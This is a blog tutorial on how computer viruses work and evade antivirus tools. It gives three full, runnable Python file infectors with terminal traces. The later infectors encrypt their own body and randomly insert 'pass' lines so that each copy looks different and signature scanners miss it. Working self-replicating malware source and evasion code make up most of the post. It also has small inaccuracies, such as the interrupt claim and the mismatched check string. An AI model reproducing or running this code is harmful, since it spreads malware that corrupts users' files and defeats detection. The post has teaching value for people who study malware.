---
title: Virus and Python
author: Guzmán Cernadas Pérez
date: 2020-12-14
tags: ["python", "malware", "obfuscation"]
---

This post will explain several issues when it comes to understanding how a virus works. They will first be explained 
what they are and how is its life cycle. The main techniques for detecting a virus will be outlined below. After, the 
main anti-antivirus techniques will be discussed. Then, it will be explained how a virus works by providing examples of 
code, to finally add various enhancements and protections so that it cannot be detected by signature.

Warning: The purpose of this publication is educational. Under no circumstances will Hackliza members be held 
responsible for to be done with this code.

# What is a virus?
A virus is a program capable of copying itself to other files. The life cycle of a virus usually consists of three 
phases:
- Infection: at this stage the virus spreads through the system, looking for possible files to reproduce and finally to 
  copy. There are two types of infection: 
  - Passive: the user of a system copies the virus somewhere and runs it. 
  - Active: the virus exploits some vulnerability to infect the system. 
- Incubation: at this stage the virus seeks to stay in the system as long as possible. 
- Illness: at this stage is when the actions not desired by the user are performed.

# How is a virus detected?
When detecting a virus, several techniques are used:

**Static techniques**. These techniques examine infected or original files without executing the code. Some examples of 
these techniques are:
- Search for viral signatures: it consists of creating a signature of a characteristic of the virus and searching for 
  it. A characteristic can be a string, a sequence of instructions, or a mark used by the virus detection mechanism.
- Spectral analysis: consists of looking for suspicious instructions used by other malicious software. For example, a 
  suspicious statement would be "a = a + 0", which does not change the behavior of the virus, but can be used to modify 
  this signature.
- Heuristic analysis: consists of analyzing the behavior of a program, to detect possible malicious actions.

**Dynamic techniques**. These techniques run the suspicious code and decide if it is malware or not based on it 
observed behavior. Some of these techniques are:
- Behavior monitoring: the memory-based antivirus will try to detect any suspicious activity and stop it. To observe 
  the behavior of a program on Linux, the antivirus will track calls made at 13H and 21H interrupts. For Windows, calls 
  to the operating system API will be tracked. 
- Code emulation (Sandboxing): the suspicious program runs on an emulated system to see its behavior.

**Checking the integrity of the files**. In this technique it is checked if a file has been modified by checking the 
hash every so often.

# Anti-antivirus techniques
These types of techniques are used to prevent an antivirus from detecting malicious code. Some of them are:

**Stealth techniques**: are a set of techniques whose goal is to convince the user that nothing bad is happening. Some 
examples of these techniques are: 
- Hooking for interruptions or calls made to the Windows API. 
- Delete your own executable. 
- Detection of a sandbox not to run.

**Polymorphism**: these are techniques aimed at avoiding signature detection. Such techniques cause the program code to 
be rewritten (in this type of modification the behavior of the virus is not changed, unless junk instructions such as 
NOP or add eax, 0 are added) or parts of it are encrypted.

**Metamorphism**: these are techniques aimed at avoiding signature detection and behavioral detection. These types of 
techniques cause the program code to be rewritten by changing its functionalities. Some techniques of metamorphism are:
- Divide an instruction into two or more. 
- Convert two instructions into one.
- Adding dead code.

**Other more intrusive techniques** are: killing the antivirus process, uninstalling the antivirus, or corrupting the 
antivirus signature database.

# Creation and operation of a virus
Python will be used as a programming language to teach how a virus works. This language was chosen because of the 
little complexity involved in creating and reading code.

Note: None of the viruses taught in this publication will contain a malicious function in order to prevent havoc. It 
should also be noted that in all the infection functions presented, only the directory from which the virus runs is 
considered.

## Creation of a virus
The virus presented below will have the functionality to self-replicate and display a message on the screen when the 
infection process is complete. Another feature is that the virus is written to the beginning of each infected file, 
causing that if a file containing the virus is executed, the malicious code is executed before the legitimate code.

Without further ado prepares to explain that make each of the parts of the virus:
- **infect** function: this function looks for possible files to infect in the folder where the virus is running. Once 
  you find a candidate, check to see if they are already infected. If it is not, a new file will be created containing 
  the virus and the candidate code.
```python
def infect(virus):
    path = "."
    for file in os.listdir(path):
        if file.endswith(".py"):
            script = open(file, "r")
            text_script = script.read()
            script.close()
            if not "# Virus:Start" in text_script:
                infected = open(file + ".infected", "w")
                infected.write(virus + "\n")
                infected.write(text_script)
                infected.close()
                os.remove(file)
                os.rename(file + ".infected", file)
```

- **payload** function: this function would contain the malicious code. In this case, only the message "You were 
  infected" is printed on the screen.
```python
def payload():
    print("You were infected")
```

- **run** function: this function calls the infect and payload functions.
```python
def run(virus):
    infect(virus)
    payload()
```

- **Global code**: This code reads the running file, extracts the virus code, and calls the run function.
```python
host = open(sys.argv[0], "r")
text_host = host.read()
host.close()
virus = text_host[text_host.find("# Virus:Start"):text_host.rfind("# Virus:End") + len("# Virus:End")]
run(virus)
```

The virus code is located between two comments: #Virus:Start and #Virus:End. These comments are intended to know the 
location of the viral code in any file (both infected and original).

Once the functions of the virus have been explained in detail, its final code is as follows:
```python
# Virus:Start
import os
import sys


def infect(virus):
    path = "."
    for file in os.listdir(path):
        if file.endswith(".py"):
            script = open(file, "r")
            text_script = script.read()
            script.close()
            if not "# Virus:Start" in text_script:
                infected = open(file + ".infected", "w")
                infected.write(virus + "\n")
                infected.write(text_script)
                infected.close()
                os.remove(file)
                os.rename(file + ".infected", file)


def payload():
    print("You were infected")


def run(virus):
    infect(virus)
    payload()


host = open(sys.argv[0], "r")
text_host = host.read()
host.close()
virus = text_host[text_host.find("# Virus:Start"):text_host.rfind("# Virus:End") + len("# Virus:End")]
run(virus)
# Virus:End
```

If you run this code in a folder with other files with the .py extension, you will get the following result:
```shell
probasvx@probasvx:~/virus1$ ls -las
total 16
4 drwxr-xr-x  2 probasvx probasvx 4096 Dec 14 11:14 .
4 drwxr-xr-x 23 probasvx probasvx 4096 Dec 14 11:05 ..
4 -rw-r--r--  1 probasvx probasvx   22 Dec 14 11:14 hello.py
4 -rw-r--r--  1 probasvx probasvx  850 Dec 14 11:14 virus.py
probasvx@probasvx:~/virus1$ cat hello.py 
print("Hello world!")
probasvx@probasvx:~/virus1$ python3 virus.py 
You were infected
probasvx@probasvx:~/virus1$ ls -las
total 16
4 drwxr-xr-x  2 probasvx probasvx 4096 Dec 14 11:15 .
4 drwxr-xr-x 23 probasvx probasvx 4096 Dec 14 11:05 ..
4 -rw-r--r--  1 probasvx probasvx  871 Dec 14 11:15 hello.py
4 -rw-r--r--  1 probasvx probasvx  850 Dec 14 11:14 virus.py
probasvx@probasvx:~/virus1$ cat hello.py 
# Virus:Start
import os
import sys


def infect(virus):
    path = "."
    for file in os.listdir(path):
        if file.endswith(".py"):
            script = open(file, "r")
            text_script = script.read()
            script.close()
            if not "# Virus:Start" in text_script:
                infected = open(file + ".infected", "w")
                infected.write(virus + "\n")
                infected.write(text_script)
                infected.close()
                os.remove(file)
                os.rename(file + ".infected", file)


def payload():
    print("You were infected")


def run(virus):
    infect(virus)
    payload()


host = open(sys.argv[0], "r")
text_host = host.read()
host.close()
virus = text_host[text_host.find("# Virus:Start"):text_host.rfind("# Virus:End") + len("# Virus:End")]
run(virus)
# Virus:End
print("Hello world!")
```

In this trace you can see how after the execution of the virus, the file hello.py has increased in size, as it now 
contains the virus code.

The main weakness of this virus is that the code is contained between the comments "#Virus:Start" and "#Virus:End". 
With this data an antivirus is able to detect and remove the code in a trivial way. On the other hand, as the code is 
always the same, it can be used as a virus signature for detection.

## Correcting weaknesses
In view of the weaknesses of the previous virus, then a protection will be added which will encrypt the code so that, 
on the one hand the encryption is different after each infection (and therefore the signing of the code as well) and on 
the other so that analysts find it harder to know what the code does. Another thing that changes is that in this virus 
will stop using the comments "#Virus:Start" and "#Virus:End" as they are evidence of the virus itself. Finally, 
infected files will have the virus code at the end instead of the beginning.

The malware below will be a germ, this is a plain text program that will generate a virus (in this case with an 
encrypted part). This germ will contain a function to encrypt and another to decrypt the code, it will also have a 
function for calculating the key with which the data is encrypted.

The different parts of the germ that will be created are the following:
- **calculate_key** function: this function calculates the encryption key from the first letters of a file. In case the 
  file contains less than 3 letters the returned key is 42.

```python
def calculate_key(text):
    if len(text) >= 3:
        key = ord(text[0]) + ord(text[1]) + ord(text[2])
    else:
        key = 42
    return key
```

- **decrypt** function: this function decrypts encrypted text with Caesar cipher.
```python
def decrypt(text, key):
    decrypted_text = ""
    for character in text:
        if character.isupper():
            decrypted_text += chr((ord(character) - key - 65) % 26 + 65)
        elif character.islower():
            decrypted_text += chr((ord(character) - key - 97) % 26 + 97)
        else:
            decrypted_text += character
    return decrypted_text
```

- **encrypt** function: this function encrypts a text with Caesar cipher.
```python
def encrypt(text, key):
    encrypted_text = ""
    for character in text:
        if character.isupper():
            encrypted_text += chr((ord(character) + key - 65) % 26 + 65)
        elif character.islower():
            encrypted_text += chr((ord(character) + key - 97) % 26 + 97)
        else:
            encrypted_text += character
    return encrypted_text
```

Note: The encryption and decryption functions have only changed uppercase and lowercase letters. The rest of the 
characters leave us the same.

- **infect** function: this function searches the folder from where the virus is running for files that have the .py 
  extension to infect them. If there is a file with this extension, the file will be opened and it will be checked if 
  it contains the string "del calcula_clave", if it does not have it, the following actions will be done:
  - The functions "encrypt", "infect", "payload" and "run" will be encrypted.
  - The calculate_key and decrypt functions will be added to the file to be infected.
  - A code will be created to decrypt the encrypted text.
  - The encrypted code and the code to decrypt it will be added at the end of the file to be infected.
```python
def infect(virus):
    import os
    for file in os.listdir("."):
        if file.endswith(".py"):
            script = open(file, "r+")
            text_script = script.read()
            if "def calculate_key" not in text_script:
                plain_part = virus[:517]
                part_to_encrypt = virus[517:]
                key = calculate_key(text_script)
                encrypted_part = encrypt(part_to_encrypt, key)
                script.write(plain_part)
                decrypter = "import sys" + chr(10) + "host = open(sys.argv[0], " + chr(34) + "r" + chr(34) + ")" + chr(10) + "host_text = host.read()" + chr(10) + "host.close()" + chr(10) + "plain_part = host_text[host_text.find(" + chr(34) + "def calculate_key" + chr(34) + "):host_text.find(" + chr(34) + "def calculate_key" + chr(34) + ")+517]" + chr(10) + "key = calculate_key(host_text)" + chr(10) + "decrypted_text = decrypt(" + chr(34) + chr(34) + chr(34) + encrypted_part + chr(34) + chr(34) + chr(34) + ", key)" + chr(10) + "exec(decrypted_text)" + chr(10) + "run(plain_part + decrypted_text)"
                script.write(decrypter)
            script.close()
```

- **decrypter** variable code: this is the code used to decrypt the encrypted contents of the virus after the first 
  infection.
```python
import sys
host = open(sys.argv[0], "r")
host_text = host.read()
host.close()
plain_part = host_text[host_text.find("def calculate_key"):host_text.find("def calculate_key")+517]
key = calculate_key(host_text)
decrypted_text = decrypt("""
wxy xgvkrim(mxqm, dxr):
    xgvkrimxw_mxqm = ""
    yhk vatktvmxk bg mxqm:

***

wxy kng(obknl):
    bgyxvm(obknl)
    itrehtw()""", key)
exec(decrypted_text)
run(plain_part + decrypted_text)
```

- **payload** function: this function would contain the malicious code. In this case, only the message "You were 
  infected" is printed on the screen.
```python
def payload():
    print("You were infected")
```

- **run** function: this function calls the infect and payload functions.
```python
def run(virus):
    infect(virus)
    payload()
```

- **Global code**: This code reads the germ code, stays with the rest with the functions explained above, and runs the 
  virus.
```python
import sys
host = open(sys.argv[0], "r")
host_text = host.read()
host.close()
virus = host_text[:2126]
run(virus)
```

After explaining all the functions, the complete germ code is as follows:
```python
def calculate_key(text):
    if len(text) >= 3:
        key = ord(text[0]) + ord(text[1]) + ord(text[2])
    else:
        key = 42
    return key


def decrypt(text, key):
    decrypted_text = ""
    for character in text:
        if character.isupper():
            decrypted_text += chr((ord(character) - key - 65) % 26 + 65)
        elif character.islower():
            decrypted_text += chr((ord(character) - key - 97) % 26 + 97)
        else:
            decrypted_text += character
    return decrypted_text


def encrypt(text, key):
    encrypted_text = ""
    for character in text:
        if character.isupper():
            encrypted_text += chr((ord(character) + key - 65) % 26 + 65)
        elif character.islower():
            encrypted_text += chr((ord(character) + key - 97) % 26 + 97)
        else:
            encrypted_text += character
    return encrypted_text


def infect(virus):
    import os
    for file in os.listdir("."):
        if file.endswith(".py"):
            script = open(file, "r+")
            text_script = script.read()
            if "def calculate_key" not in text_script:
                plain_part = virus[:517]
                part_to_encrypt = virus[517:]
                key = calculate_key(text_script)
                encrypted_part = encrypt(part_to_encrypt, key)
                script.write(plain_part)
                decrypter = "import sys" + chr(10) + "host = open(sys.argv[0], " + chr(34) + "r" + chr(34) + ")" + chr(10) + "host_text = host.read()" + chr(10) + "host.close()" + chr(10) + "plain_part = host_text[host_text.find(" + chr(34) + "def calculate_key" + chr(34) + "):host_text.find(" + chr(34) + "def calculate_key" + chr(34) + ")+517]" + chr(10) + "key = calculate_key(host_text)" + chr(10) + "decrypted_text = decrypt(" + chr(34) + chr(34) + chr(34) + encrypted_part + chr(34) + chr(34) + chr(34) + ", key)" + chr(10) + "exec(decrypted_text)" + chr(10) + "run(plain_part + decrypted_text)"
                script.write(decrypter)
            script.close()


def payload():
    print("You were infected")


def run(virus):
    infect(virus)
    payload()


import sys
host = open(sys.argv[0], "r")
host_text = host.read()
host.close()
virus = host_text[:2126]
run(virus)
```

If we run this code in a folder where there is another file whose extension is .py we will get the following trace:
```shell
probasvx@probasvx:~/virus2$ ls -las
total 16
4 drwxr-xr-x  2 probasvx probasvx 4096 Dec 13 13:49 .
4 drwxr-xr-x 22 probasvx probasvx 4096 Dec 13 12:11 ..
4 -rw-r--r--  1 probasvx probasvx   22 Dec 13 13:49 hello.py
4 -rw-r--r--  1 probasvx probasvx 2243 Dec 13 13:06 virus.py
probasvx@probasvx:~/virus2$ cat hello.py 
print("Hello world!")
probasvx@probasvx:~/virus2$ python3 virus.py 
You were infected
probasvx@probasvx:~/virus2$ ls -las
total 16
4 drwxr-xr-x  2 probasvx probasvx 4096 Dec 13 13:49 .
4 drwxr-xr-x 22 probasvx probasvx 4096 Dec 13 12:11 ..
4 -rw-r--r--  1 probasvx probasvx 2448 Dec 13 13:49 hello.py
4 -rw-r--r--  1 probasvx probasvx 2243 Dec 13 13:06 virus.py
```

In this trace you can see that the file hello.py has increased in size. The content it contains after running the virus 
is as follows:
```python
print("Hello world!")
def calculate_key(text):
    if len(text) >= 3:
        key = ord(text[0]) + ord(text[1]) + ord(text[2])
    else:
        key = 42
    return key


def decrypt(text, key):
    decrypted_text = ""
    for character in text:
        if character.isupper():
            decrypted_text += chr((ord(character) - key - 65) % 26 + 65)
        elif character.islower():
            decrypted_text += chr((ord(character) - key - 97) % 26 + 97)
        else:
            decrypted_text += character
    return decrypted_text

import sys
host = open(sys.argv[0], "r")
host_text = host.read()
host.close()
plain_part = host_text[host_text.find("def calculate_key"):host_text.find("def calculate_key")+517]
key = calculate_key(host_text)
decrypted_text = decrypt("""
wxy xgvkrim(mxqm, dxr):
    xgvkrimxw_mxqm = ""
    yhk vatktvmxk bg mxqm:
        by vatktvmxk.blniixk():
            xgvkrimxw_mxqm += vak((hkw(vatktvmxk) + dxr - 65) % 26 + 65)
        xeby vatktvmxk.blehpxk():
            xgvkrimxw_mxqm += vak((hkw(vatktvmxk) + dxr - 97) % 26 + 97)
        xelx:
            xgvkrimxw_mxqm += vatktvmxk
    kxmnkg xgvkrimxw_mxqm


wxy bgyxvm(obknl):
    bfihkm hl
    yhk ybex bg hl.eblmwbk("."):
        by ybex.xgwlpbma(".ir"):
            lvkbim = hixg(ybex, "k+")
            mxqm_lvkbim = lvkbim.kxtw()
            by "wxy vtevnetmx_dxr" ghm bg mxqm_lvkbim:
                ietbg_itkm = obknl[:517]
                itkm_mh_xgvkrim = obknl[517:]
                dxr = vtevnetmx_dxr(mxqm_lvkbim)
                xgvkrimxw_itkm = xgvkrim(itkm_mh_xgvkrim, dxr)
                lvkbim.pkbmx(ietbg_itkm)
                wxvkrimxk = "bfihkm lrl" + vak(10) + "ahlm = hixg(lrl.tkzo[0], " + vak(34) + "k" + vak(34) + ")" + vak(10) + "ahlm_mxqm = ahlm.kxtw()" + vak(10) + "ahlm.vehlx()" + vak(10) + "ietbg_itkm = ahlm_mxqm[ahlm_mxqm.ybgw(" + vak(34) + "wxy vtevnetmx_dxr" + vak(34) + "):ahlm_mxqm.ybgw(" + vak(34) + "wxy vtevnetmx_dxr" + vak(34) + ")+517]" + vak(10) + "dxr = vtevnetmx_dxr(ahlm_mxqm)" + vak(10) + "wxvkrimxw_mxqm = wxvkrim(" + vak(34) + vak(34) + vak(34) + xgvkrimxw_itkm + vak(34) + vak(34) + vak(34) + ", dxr)" + vak(10) + "xqxv(wxvkrimxw_mxqm)" + vak(10) + "kng(ietbg_itkm + wxvkrimxw_mxqm)"
                lvkbim.pkbmx(wxvkrimxk)
            lvkbim.vehlx()


wxy itrehtw():
    ikbgm("Rhn pxkx bgyxvmxw")


wxy kng(obknl):
    bgyxvm(obknl)
    itrehtw()""", key)
exec(decrypted_text)
run(plain_part + decrypted_text)
```

The following parts can be seen in the infected file: 
- The code of the previous program (the "Hello world!"). 
- The functions for key calculation and decryption. 
- The encrypted code along with the calls the key calculation and decryption functions. 
- Call the exec function for Python to interpret the decrypted code.

After all the changes made to the initial virus there is still a weakness, this virus can be detected by the decryption 
and key calculation functions, as these can be used as a signature for virus detection.

It should be noted that this virus infects files that do not contain the string "def calculate_key", so if a legitimate 
string exists in a program or script, it will not be infected.

## Avoiding signature detection
In this new version, the functionality of modifying the code of non-encrypted functions (calculate_key and decrypt) 
will be added by adding the reserved word "pass" several times at random in this code. It must be said that the 
reserved word "pass" has no effect on the functionality of the functions. Each time the virus runs, the new infected 
files may have the "pass" in different positions. This modification is intended not to use code that is not encrypted 
as a signature of the virus.

To achieve the functionality described, the following functions have been added and modified:
- **delete_pass** function: this function clears all occurrences of the reserved word "pass" in unencrypted code.
```python
def delete_pass(code):
    code_without_pass = []
    for line in code.split(chr(10)):
        if not "pass" in line:
            code_without_pass.append(line)
    return chr(10).join(code_without_pass)
```

- **calculate_tabulation** function: this function calculates the number of spaces preceding a “pass” when is inserted.
```python
def calculate_tabulation(code, position):
    if "else" in code[position] or "elif" in code[position]:
        return len(code[position]) - len(code[position].lstrip()) + 4
    return len(code[position]) - len(code[position].lstrip())
```

- **add_pass** function: this function is the one that randomly places the "pass" in the unencrypted code.
```python
def add_pass(code):
    import random
    lines = code.split(chr(10))
    for i in range(10):
        if random.random() > 0.75:
            insertion_position = random.randint(1, len(lines) - 1)
            lines.insert(insertion_position, " " * calculate_tabulation(lines, insertion_position) + "pass")
    return chr(10).join(lines)
```

- **modify** function: this function is responsible for deleting previous "passes" and adding new ones to each of the 
  unencrypted functions.
```python
def modify(code):
    new_code = []
    separator = chr(10) + chr(10) + chr(10)
    functions = code.split(separator)
    for text in functions:
        if text:
            code_without_pass = delete_pass(text)
            code_with_pass = add_pass(code_without_pass)
            new_code.append(code_with_pass)
        else:
            new_code.append(text)
    return separator.join(new_code)
```

- **infect** function: this function does the same as before, but now:
  - Instead of getting the part and clear and the part to be encrypted using a fixed value, you get by looking for the 
    position of the cipher function.
  - The function modify is called so the code that is not encrypted is different.
  - The decrypter code no longer has the fixed value to indicate the length of the decrypted part; it is now calculated 
    based on the size of the modified code.
```python
def infect(virus):
    import os
    for file in os.listdir("."):
        if file.endswith(".py"):
            script = open(file, "r+")
            text_script = script.read()
            if "def calculate_key" not in text_script:
                plain_part = virus[:virus.find("def encrypt")]
                part_to_encrypt = virus[virus.find("def encrypt"):]
                modified_plain_part = modify(plain_part)
                key = calculate_key(text_script)
                encrypted_part = encrypt(part_to_encrypt, key)
                script.write(modified_plain_part)
                decrypter = "import sys" + chr(10) + "host = open(sys.argv[0], " + chr(34) + "r" + chr(34) + ")" + chr(10) + "host_text = host.read()" + chr(10) + "host.close()" + chr(10) + "plain_part = host_text[host_text.find(" + chr(34) + "def calculate_key" + chr(34) + "):host_text.find(" + chr(34) + "def calculate_key" + chr(34) + ")+" + str(len(modified_plain_part)) + "]" + chr(10) + "key = calculate_key(host_text)" + chr(10) + "decrypted_text = decrypt(" + chr(34) + chr(34) + chr(34) + encrypted_part + chr(34) + chr(34) + chr(34) + ", key)" + chr(10) + "exec(decrypted_text)" + chr(10) + "run(plain_part + decrypted_text)"
                script.write(decrypter)
            script.close()
```

The other functions of the germ (calculate_key, decrypt, encrypt, payload, and run) and global code have not changed. 
That said, the full code for this germ is as follows:
```python
def calculate_key(text):
    if len(text) >= 3:
        key = ord(text[0]) + ord(text[1]) + ord(text[2])
    else:
        key = 42
    return key


def decrypt(text, key):
    decrypted_text = ""
    for character in text:
        if character.isupper():
            decrypted_text += chr((ord(character) - key - 65) % 26 + 65)
        elif character.islower():
            decrypted_text += chr((ord(character) - key - 97) % 26 + 97)
        else:
            decrypted_text += character
    return decrypted_text


def encrypt(text, key):
    encrypted_text = ""
    for character in text:
        if character.isupper():
            encrypted_text += chr((ord(character) + key - 65) % 26 + 65)
        elif character.islower():
            encrypted_text += chr((ord(character) + key - 97) % 26 + 97)
        else:
            encrypted_text += character
    return encrypted_text


def delete_pass(code):
    code_without_pass = []
    for line in code.split(chr(10)):
        if not "pass" in line:
            code_without_pass.append(line)
    return chr(10).join(code_without_pass)


def calculate_tabulation(code, position):
    if "else" in code[position] or "elif" in code[position]:
        return len(code[position]) - len(code[position].lstrip()) + 4
    return len(code[position]) - len(code[position].lstrip())


def add_pass(code):
    import random
    lines = code.split(chr(10))
    for i in range(10):
        if random.random() > 0.75:
            insertion_position = random.randint(1, len(lines) - 1)
            lines.insert(insertion_position, " " * calculate_tabulation(lines, insertion_position) + "pass")
    return chr(10).join(lines)


def modify(code):
    new_code = []
    separator = chr(10) + chr(10) + chr(10)
    functions = code.split(separator)
    for text in functions:
        if text:
            code_without_pass = delete_pass(text)
            code_with_pass = add_pass(code_without_pass)
            new_code.append(code_with_pass)
        else:
            new_code.append(text)
    return separator.join(new_code)


def infect(virus):
    import os
    for file in os.listdir("."):
        if file.endswith(".py"):
            script = open(file, "r+")
            text_script = script.read()
            if "def calculate_key" not in text_script:
                plain_part = virus[:virus.find("def encrypt")]
                part_to_encrypt = virus[virus.find("def encrypt"):]
                modified_plain_part = modify(plain_part)
                key = calculate_key(text_script)
                encrypted_part = encrypt(part_to_encrypt, key)
                script.write(modified_plain_part)
                decrypter = "import sys" + chr(10) + "host = open(sys.argv[0], " + chr(34) + "r" + chr(34) + ")" + chr(10) + "host_text = host.read()" + chr(10) + "host.close()" + chr(10) + "plain_part = host_text[host_text.find(" + chr(34) + "def calculate_key" + chr(34) + "):host_text.find(" + chr(34) + "def calculate_key" + chr(34) + ")+" + str(len(modified_plain_part)) + "]" + chr(10) + "key = calculate_key(host_text)" + chr(10) + "decrypted_text = decrypt(" + chr(34) + chr(34) + chr(34) + encrypted_part + chr(34) + chr(34) + chr(34) + ", key)" + chr(10) + "exec(decrypted_text)" + chr(10) + "run(plain_part + decrypted_text)"
                script.write(decrypter)
            script.close()


def payload():
    print("You were infected")


def run(virus):
    infect(virus)
    payload()


import sys
host = open(sys.argv[0], "r")
host_text = host.read()
host.close()
virus = host_text[:3450]
run(virus)
```

If we run the germ in a folder with several files with .py extension we will get the following trace:
```shell
probasvx@probasvx:~/virus3$ ls -las
total 20
4 drwxr-xr-x  2 probasvx probasvx 4096 Dec 13 19:11 .
4 drwxr-xr-x 23 probasvx probasvx 4096 Dec 13 18:32 ..
4 -rw-r--r--  1 probasvx probasvx   41 Dec 13 19:11 hello2.py
4 -rw-r--r--  1 probasvx probasvx   22 Dec 13 19:11 hello.py
4 -rw-r--r--  1 probasvx probasvx 3567 Dec 13 19:08 virus.py
probasvx@probasvx:~/virus3$ cat hello.py 
print("Hello world!")
probasvx@probasvx:~/virus3$ cat hello2.py 
# Comment
print("Hello another time :)")
probasvx@probasvx:~/virus3$ python3 virus.py 
You were infected
probasvx@probasvx:~/virus3$ ls -las
total 20
4 drwxr-xr-x  2 probasvx probasvx 4096 Dec 13 19:11 .
4 drwxr-xr-x 23 probasvx probasvx 4096 Dec 13 18:32 ..
4 -rw-r--r--  1 probasvx probasvx 3817 Dec 13 19:58 hello2.py
4 -rw-r--r--  1 probasvx probasvx 3862 Dec 13 19:58 hello.py
4 -rw-r--r--  1 probasvx probasvx 3567 Dec 13 19:08 virus.py
```

In the trace it can be seen that the size of the file hello2.py, before the execution of the virus, had 19 bytes more 
than hello.py. After running the virus, hello.py is 45 bytes largest. This is due to the number and position of "pass" 
inserted in the unencrypted code of the virus. The following are the codes for each file:
```shell
probasvx@probasvx:~/virus3$ cat hello.py 
print("Hello world!")
def calculate_key(text):
    if len(text) >= 3:
        key = ord(text[0]) + ord(text[1]) + ord(text[2])
        pass
        pass
        pass
    else:
        key = 42
    return key


def decrypt(text, key):
    decrypted_text = ""
    for character in text:
        if character.isupper():
            decrypted_text += chr((ord(character) - key - 65) % 26 + 65)
        elif character.islower():
            pass
            decrypted_text += chr((ord(character) - key - 97) % 26 + 97)
            pass
        else:
            pass
            decrypted_text += character
    return decrypted_text
```

```shell
probasvx@probasvx:~/virus3$ cat hello2.py 
# Comment
print("Hello another time :)")
def calculate_key(text):
    pass
    if len(text) >= 3:
        key = ord(text[0]) + ord(text[1]) + ord(text[2])
    else:
        key = 42
    return key


def decrypt(text, key):
    decrypted_text = ""
    for character in text:
        if character.isupper():
            pass
            decrypted_text += chr((ord(character) - key - 65) % 26 + 65)
        elif character.islower():
            decrypted_text += chr((ord(character) - key - 97) % 26 + 97)
        else:
            decrypted_text += character
    return decrypted_text
```

The complete code of an infected file is as follows:
```python
print("Hello world!")
def calculate_key(text):
    if len(text) >= 3:
        key = ord(text[0]) + ord(text[1]) + ord(text[2])
        pass
        pass
        pass
    else:
        key = 42
    return key


def decrypt(text, key):
    decrypted_text = ""
    for character in text:
        if character.isupper():
            decrypted_text += chr((ord(character) - key - 65) % 26 + 65)
        elif character.islower():
            pass
            decrypted_text += chr((ord(character) - key - 97) % 26 + 97)
            pass
        else:
            pass
            decrypted_text += character
    return decrypted_text


import sys
host = open(sys.argv[0], "r")
host_text = host.read()
host.close()
plain_part = host_text[host_text.find("def calculate_key"):host_text.find("def calculate_key")+608]
key = calculate_key(host_text)
decrypted_text = decrypt("""wxy xgvkrim(mxqm, dxr):
    xgvkrimxw_mxqm = ""
    yhk vatktvmxk bg mxqm:
        by vatktvmxk.blniixk():
            xgvkrimxw_mxqm += vak((hkw(vatktvmxk) + dxr - 65) % 26 + 65)
        xeby vatktvmxk.blehpxk():
            xgvkrimxw_mxqm += vak((hkw(vatktvmxk) + dxr - 97) % 26 + 97)
        xelx:
            xgvkrimxw_mxqm += vatktvmxk
    kxmnkg xgvkrimxw_mxqm


wxy wxexmx_itll(vhwx):
    vhwx_pbmahnm_itll = []
    yhk ebgx bg vhwx.liebm(vak(10)):
        by ghm "itll" bg ebgx:
            vhwx_pbmahnm_itll.tiixgw(ebgx)
    kxmnkg vak(10).chbg(vhwx_pbmahnm_itll)


wxy vtevnetmx_mtunetmbhg(vhwx, ihlbmbhg):
    by "xelx" bg vhwx[ihlbmbhg] hk "xeby" bg vhwx[ihlbmbhg]:
        kxmnkg exg(vhwx[ihlbmbhg]) - exg(vhwx[ihlbmbhg].elmkbi()) + 4
    kxmnkg exg(vhwx[ihlbmbhg]) - exg(vhwx[ihlbmbhg].elmkbi())


wxy tww_itll(vhwx):
    bfihkm ktgwhf
    ebgxl = vhwx.liebm(vak(10))
    yhk b bg ktgzx(10):
        by ktgwhf.ktgwhf() > 0.75:
            bglxkmbhg_ihlbmbhg = ktgwhf.ktgwbgm(1, exg(ebgxl) - 1)
            ebgxl.bglxkm(bglxkmbhg_ihlbmbhg, " " * vtevnetmx_mtunetmbhg(ebgxl, bglxkmbhg_ihlbmbhg) + "itll")
    kxmnkg vak(10).chbg(ebgxl)


wxy fhwbyr(vhwx):
    gxp_vhwx = []
    lxitktmhk = vak(10) + vak(10) + vak(10)
    yngvmbhgl = vhwx.liebm(lxitktmhk)
    yhk mxqm bg yngvmbhgl:
        by mxqm:
            vhwx_pbmahnm_itll = wxexmx_itll(mxqm)
            vhwx_pbma_itll = tww_itll(vhwx_pbmahnm_itll)
            gxp_vhwx.tiixgw(vhwx_pbma_itll)
        xelx:
            gxp_vhwx.tiixgw(mxqm)
    kxmnkg lxitktmhk.chbg(gxp_vhwx)


wxy bgyxvm(obknl):
    bfihkm hl
    yhk ybex bg hl.eblmwbk("."):
        by ybex.xgwlpbma(".ir"):
            lvkbim = hixg(ybex, "k+")
            mxqm_lvkbim = lvkbim.kxtw()
            by "wxy vtevnetmx_dxr" ghm bg mxqm_lvkbim:
                ietbg_itkm = obknl[:obknl.ybgw("wxy xgvkrim")]
                itkm_mh_xgvkrim = obknl[obknl.ybgw("wxy xgvkrim"):]
                fhwbybxw_ietbg_itkm = fhwbyr(ietbg_itkm)
                dxr = vtevnetmx_dxr(mxqm_lvkbim)
                xgvkrimxw_itkm = xgvkrim(itkm_mh_xgvkrim, dxr)
                lvkbim.pkbmx(fhwbybxw_ietbg_itkm)
                wxvkrimxk = "bfihkm lrl" + vak(10) + "ahlm = hixg(lrl.tkzo[0], " + vak(34) + "k" + vak(34) + ")" + vak(10) + "ahlm_mxqm = ahlm.kxtw()" + vak(10) + "ahlm.vehlx()" + vak(10) + "ietbg_itkm = ahlm_mxqm[ahlm_mxqm.ybgw(" + vak(34) + "wxy vtevnetmx_dxr" + vak(34) + "):ahlm_mxqm.ybgw(" + vak(34) + "wxy vtevnetmx_dxr" + vak(34) + ")+" + lmk(exg(fhwbybxw_ietbg_itkm)) + "]" + vak(10) + "dxr = vtevnetmx_dxr(ahlm_mxqm)" + vak(10) + "wxvkrimxw_mxqm = wxvkrim(" + vak(34) + vak(34) + vak(34) + xgvkrimxw_itkm + vak(34) + vak(34) + vak(34) + ", dxr)" + vak(10) + "xqxv(wxvkrimxw_mxqm)" + vak(10) + "kng(ietbg_itkm + wxvkrimxw_mxqm)"
                lvkbim.pkbmx(wxvkrimxk)
            lvkbim.vehlx()


wxy itrehtw():
    ikbgm("Rhn pxkx bgyxvmxw")


wxy kng(obknl):
    bgyxvm(obknl)
    itrehtw()""", key)
exec(decrypted_text)
run(plain_part + decrypted_text)
```

Finally, remember that this variant of the virus, like the previous one, infects files that do not contain the string 
"def calcula_clave", so if a string exists in a legitimate program or script, it will not be infected.

# To keep in mind
## File discrimination
In the last two variants of the virus, it happens that when seeing if a file is previously infected, it is checked if 
it contains the string "def calcula_clave". When a virus uses a way to detect itself, it allows analysts to know this 
same information, so they will know how to detect whether a file may be infected or not.

